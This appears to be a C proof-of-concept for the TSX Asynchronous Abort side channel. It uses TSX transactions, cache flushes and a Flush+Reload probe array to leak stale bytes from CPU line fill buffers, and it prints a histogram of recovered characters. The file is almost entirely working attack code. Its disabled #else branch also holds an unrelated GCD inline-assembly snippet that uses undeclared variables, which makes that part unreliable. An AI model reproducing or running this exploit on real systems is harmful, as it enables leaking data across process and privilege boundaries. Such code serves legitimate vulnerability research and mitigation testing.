#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include "cacheutils.h"

#define FROM 'A'
#define TO   'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];
volatile long long aborted = 0;
volatile long long not_aborted = 0;
void recover(void);
int main(int argc, char *argv[])
{
  if(!has_tsx()) {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }
    
  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }
  
  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);

  while (true) {
    /* Flush mapping */
    flush(mapping);
#if 1
    /* Begin transaction and recover value */
    if(xbegin() == (~0u)) {

	 /*
	  * Reference: Intel Deep Dive TSX
	  * Intel TSX transactions can also be asynchronously aborted,
	  * such as when a different logical processor writes to a cache
	  * line that is part of the transaction’s read set, or when the
	  * transaction exceeds its memory buffering space, or due to
	  * other microarchitectural reasons.
	  */

      /*
       * Transaction abort will happen here
       * Flush instruction introduce conflicts in cache line due to which transaction is aborted
       * Due to Transaction abort, stale value from line fill buffer will be leaked
       */
      char byte = (char) mapping[0];
      
      /*
       * Use leak byte as a index in probed mem array
       * 4096 is here because probe array has 256 entries 4096 interval apart
       */
      char *p = mem + (byte * 4096);

      /*
       * Access the byte to leave footprint in cache
       */
      *(volatile char *)p;

      ++ not_aborted;
      xend();
    }
    else {
        ++ aborted;
    }
#else

//    ; %rdi = leak source
//    ; %rsi = FLUSH + RELOAD channel
//    taa_sample:
//    ; Cause TSX to abort asynchronously.
//    clflush (%rdi)
//    clflush (%rsi)
//
//    ; Leak a single byte.
//    xbegin abort
//    movq (%rdi), %rax
//    shl $12, %rax
//    andq $0xff000, %rax
//    movq (%rax, %rsi), %rax
//    xend
//    abort:
//    retq
    __asm__ __volatile__ ( "movl %1, %%eax;"
                          "movl %2, %%ebx;"
                          "CONTD: cmpl $0, %%ebx;"
                          "je DONE;"
                          "xorl %%edx, %%edx;"
                          "idivl %%ebx;"
                          "movl %%ebx, %%eax;"
                          "movl %%edx, %%ebx;"
                          "jmp CONTD;"
                          "DONE: movl %%eax, %0;" : "=g" (result) : "g" (a), "g" (b)
    );

#endif
    
    /* Recover through probe mem array */
    recover();
  }

  return 0;
}

int timeout = 0;
void recover(void) {

    /* Recover value from cache and update histogram */
    bool update = false;
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        hist[i]++;
        update = true;
      }
    }
#if 1
    /* Redraw histogram on update */
    if (update == true) {
        printf("\x1b[2J");

        int max = 1;

        if (timeout++ > 200)
        {
        	timeout = 0;

			for (int i = FROM; i <= TO; i++) {
			  if (hist[i] > max) {
				max = hist[i];
			  }
			}

			for (int i = FROM; i <= TO; i++) {
				printf("%c: (%4u) ", i, (unsigned int)hist[i]);
				for (int j = 0; j < hist[i] * 60 / max; j++) {
				  printf("#");
				}
				printf("\n");
			}

			printf("Aborted Count => %lld\n", aborted);
			printf("Not-Aborted Count => %lld\n", not_aborted);

			fflush(stdout);
        }
    }
#endif
}
